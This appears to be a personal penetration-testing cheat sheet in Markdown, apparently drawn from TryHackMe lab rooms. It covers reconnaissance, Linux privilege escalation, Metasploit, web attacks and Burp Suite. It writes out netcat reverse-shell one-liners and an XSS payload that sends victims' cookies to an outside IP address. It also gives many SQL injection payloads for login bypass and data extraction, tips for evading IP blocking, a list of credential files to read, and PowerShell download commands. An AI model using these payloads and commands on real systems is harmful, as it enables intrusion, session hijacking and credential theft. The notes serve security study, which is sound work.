- [Net Sec](#net-sec)
  - [passive](#passive)
  - [active](#active)
    - [](#)
  - [Shell](#shell)
    - [Priv Escalation](#priv-escalation)
      - [shared libraries](#shared-libraries)
      - [capabilities](#capabilities)
      - [Cronjobs](#cronjobs)
      - [PATH](#path)
      - [NFS](#nfs)
- [Getting file into target](#getting-file-into-target)
- [Working with executables](#working-with-executables)
  - [finding them](#finding-them)
- [browsing important files](#browsing-important-files)
- [Metasploit with database](#metasploit-with-database)
  - [Meterpreter (payload)](#meterpreter-payload)
  - [Recoinaissance](#recoinaissance)
- [Basic Enum](#basic-enum)
- [Web hacking](#web-hacking)
  - [Subdomain](#subdomain)
  - [Wildcards](#wildcards)
  - [User enumeration](#user-enumeration)
  - [IDOR](#idor)
  - [File inclusion](#file-inclusion)
  - [SSRF](#ssrf)
  - [XSS](#xss)
  - [Command injection](#command-injection)
  - [Authentication](#authentication)
  - [database](#database)
    - [Steps](#steps)
    - [UNION](#union)
      - [Find data oracle](#find-data-oracle)
    - [blind](#blind)
      - [binary](#binary)
        - [sqlmap](#sqlmap)
        - [Provoking errors](#provoking-errors)
      - [Time](#time)
- [burpsuite](#burpsuite)
  - [Repeater](#repeater)
  - [Intruder](#intruder)
    - [Macros](#macros)
  - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
- [Usefull Windows commands](#usefull-windows-commands)


# Net Sec

## passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- shodan.io [check black friday - https://www.shodan.io/]
- 
## active
- interacting
- nmap
- https://www.rapid7.com/db/
- searchsploit
  

### 


- hydra -l username -P wordlist.txt server service
- -d = debug
- -vv = verbpse

## Shell
- Reverse:
  - target: 
    - nc <LOCAL-IP> <PORT> -e /bin/bash
    - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”


  - Ziel: nc -nlvp PORT

### Priv Escalation
- https://tryhackme.com/room/introtoshells
- https://tryhackme.com/room/linprivesc
- Check list
  - hostname
  - uname -a = sys info, kernel, 
  - /proc/version = process, compiler,
  - /etc/issue = OS info
  - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
  - env = environmental variables
  - cat /etc/passwd | cut -d ":" -f 1 // grep home
  - ifconfig
  - netstat -a | -at [tcp] -au [upd] | -l [listening] | -s [statistic] | -tp [pid] | -i [interface_data]
  - find 2>/dev/null = redirect errors
    - -name, -perm a=x, -mtime
    - find / = directory config
    - -perm -u=s = SUID
    - -name perl*, python*, gcc* = dev tools
    - find / -type f -perm -04000 -ls 2>/dev/null ==> *SUID or SGID* files
    - find / -writable 2>/dev/null ==> find writable folders

#### shared libraries 
- sudo -l ==> LD_PRELOAD ==>   
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
- ldd = shared object dependencies

#### capabilities
- getcap -r / 2>/dev/null

#### Cronjobs
- privilege of the owner
- find script with root privilege
- /etc/crontab
- check if file has no fullpath + create own script with reverse shell

#### PATH
- echo $PATH
- export PATH=/path/to/folder:$PATH
- PATH=$PATH:/path/to/folder
- find / -writable 2>/dev/null ==> find writable folders
  - find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
  - find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u ==> exclude running process

#### NFS
- find root key + connect
- /etc/exports ==> find no_root_squash = create x with SUID
- showmount -e target-IP
- mount no_root_squash from /etc/exports

# Getting file into target
- Option 1 - starting local server
  1. python3 -m http.server 8000
  2. wget attacker-machine:8000:file.ext
  3. make executable: chmod +x file.ext
- Option 2 - copy source
  1. Copy code from source and past in the target + save .sh
  2. make executable: chmod +x file.ext

# Working with executables

## finding them
- Option 1
  - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

- Option 2
  - strings /usr/local/bin/suid-env2
  - /bin/bash --version < 4.2
  - function /usr/sbin/service { /bin/bash -p; }
  - export -f /usr/sbin/service
  - /usr/local/bin/suid-env2

# browsing important files  
- History
  - cat ~/.*history | less
  - .ssh Folder is always a must

# Metasploit with database

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

## Meterpreter (payload)
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search

## Recoinaissance

- db_nmap 
  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
    - https://www.exploit-db.com/
    - https://nvd.nist.gov/vuln/full-listing
  - -sC: other common scripts
  - -sS (Syn), -sA(Ack)
  - -A: basic scan with OS include
    - -sV -O -sC [default scripts] --traceroute
  - -sS: syn
  - -p-: all ports
  - -sV: version of services found
  - -Pn: no ping
  - -T[0-5] = Control speed
  - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
  - --spoof-mac [MAC]
  - -f[-f] => fragment
  - --reason / -v / -vv / -d / -dd


- Output
  - -oN = normal output
  - -oG = grep output

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

# Basic Enum

- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 


# Web hacking

## Subdomain
- search certificates: 
  - https://transparencyreport.google.com/https/overview
  - https://crt.sh/
    - $ curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt
    - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
- Google search engine: site:*.domain.com
- dnsrecon
- dnsdumpster => online


 
## Wildcards 
- A lot of false positive
- need to be filtered
- 
- dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force
  
- OWAPS *Amass*: amass -src -ip -active -brute -d
  - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
  - amass -passive -d domain.de -src
  - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
  - https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a

- Create wordlist (from commands above)
  - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
  
## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## IDOR
Insecure Direct Object Request

## File inclusion
- insecure input validation
- path traversal: ../../../etc/passwd
- Important files
  - /etc/issue - system identification
  - /etc/profile - default variables terminal
  - /proc/version - kernen versel
  - /etc/shadow - users password
  - /root/.bash_history
  - /var/log/dmessage
  - /root/.ssh/id_rsa = private rsa key
  - /var/log/apache2/access.log
  - C:\boot.ini (windows)


- null byte = %00, injection (terminate string)
- curl -X METHOD -d [data]

## SSRF
- Server-Side Request Forgery
- Where? 
  - Full Paramter in the address bar ("value="http..../name")
  - partial URL
  - Blind: requestbin.com
  - ../ => directory trasversal
  - &x= ==> ignore everything that comes after that

## XSS
- Cross-Site Scripting
- test: parameters, URL File Path, HTTP Headers
- in js onload event within a tag
- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
- Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
-                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 

## Command injection
- blind: no output, test with ping/sleep/timeout(win) || force output > etwas
  - curl http://website/command
- verbose: output/feedback
- $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"

## Authentication
- Brute force: 
  - in Header ==> **X-Forwarded-For**: [IP] ==> avoid IP blocking
  - intercalate correct login AND brute force (intruder)

- Blocked account
  - enumerate username until valid one ==> NULL payload for password + several tries until get different response
  - try password with these usernames ==> grep warning for incorrect passwords


## database

### Steps
- find vulnerability: ', "
- find total columns: UNION SELECT NULL,NULL,NULL
- find name of db: UNION SELECT NULL,NULL,database()
- find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
- find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
- find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae

- Column_name known
  - aa' field=(COMMAND),field='

- Bypass login: 
  - admin'-- [everything here is a comment and will be ignored]
  - or 1 = 1'-- ==> will always return true
  - header:  X-Forwarded-For: IP

### UNION
- join two or more tables + number o columns and data type muss be equal
- 'UNION SELECT NULL,NULL...-- - ==> until success to find number of columns
  - NULL = compatible with all data type
- 'UNION SELECT column1,column2 FROM table_name-- -
- find db = '0 union 1,2,database()-- -
- find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
  -  information_schema = info about all databases and tables
- find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
- content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

- SQLITE 
  - exist vuln: ' UNION SELECT 1,2'
  - find tables: ' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%''
  - find columns: ' UNION SELECT 1,group_concat(column_name) FROM table_name '
  - find content: ' UNION SELECT 1,group_concat(column1 || '-' || column2) FROM table_name '
  
- Find version (always UNION)
  - Microsoft, MySQL	SELECT @@version
  - Oracle	SELECT * FROM v$version
  - PostgreSQL	SELECT version()


#### Find data oracle
Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='table_name'
Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 

### blind
- Change SQL Command in the trackinID + test
- Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
- Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
  - admin' AND length((SELECT password from users where username='admin'))==37-- -
  
- Getting data string per string:
  - SELECT column FROM table_name LIMIT 0,1-- - //
    - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
  - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)

#### binary
- like a% = starting with a
- Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
- Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
- find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
- find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
- find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--

- individual charachter + size
  - ' AND (SELECT 'a' FROM [table]  WHERE [column]='value' AND LENGTH(value)>§1§)='a;==> payload type number to find 1 until n
  -(SQLITE): [known_value]' AND length((SELECT [column] FROM [table] WHERE [column]='value'))==37-- -
 - find substring SQLITE: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
 
 ##### sqlmap
- sqlmap
  - -u = url
  - --data="id=123&password=123"
  - --level= ??
  - --risk= ??
  - --dbms=type of db
  - --technique=???
  - --dumb

##### Provoking errors
- Oracle
  - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    - case = false  ==> no error produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = FALSE ==> execute after ELSE query
      - Condition = TRUE ==> forced error 1/0
      - Condition = FALSE ==> goes to 2nd question and asks if the info about the db is correct

  - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    - case = true ==> error will be produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query

#### Time
- with sleep() ==> success if the function is executed
- admin123' UNION SELECT SLEEP(5),1,x,y,z;--
- similar to blind
- admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
  
- Microsoft: 
 - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
 - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action

- PostgreSQL:
  - ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--


- in the intruder: substring method with password list
' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
 - SUBSTRING(string, start, length)
 - Cluster Bomb: several $payload$, one for the position_number, one for the string
 - Brute_force: iterate over given list




- Known table, columns:
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--


admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
admin123' UNION SELECT SLEEP(5),2;--

# burpsuite

## Repeater
- manipulate the request
- check response
- 
## Intruder
- brute force and fuzzing
- Positions: where to insert payload
- Attack types 
  - **sniper**: one set of payload (wordlist) / i.g. username/password
  - **battering ram**: same payload in every position
  - **pitchfork**: several sniper at the same time, one payload per position. For credentials
  - **Clusterbomb**: multiple payload, individual iteration, every combination

- Payload: define list file, regex or other condition
- Filtering results: 
  - status (200, 401, 302)
  - size: sucess 400 bytes, failed 600 bytes

- CSRF Token: 
  - token changed by every update of the page
  - define macros
  
### Macros
- Repeated actions
- project options + add + selection action to be done
- Session handling rule: select macro + select where to do it (intruder, repeater, target) + update only "name of the field", 

## Decoder, Comparer, Sequencer
- Decoder
  - Encode e decode data
  - hashsums, ASCII, binary, hexa, etc

- Comparer
  - compare data
  - compare responses after logins attempt

- Sequencer
  - measure entropy of tokens
  - analyze after an amount of tokens
  - Auto Analyze = capture every 2000 requests
  

# Usefull Windows commands
- Find file: wmic find users || dir /p datei.txt (find file)
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"

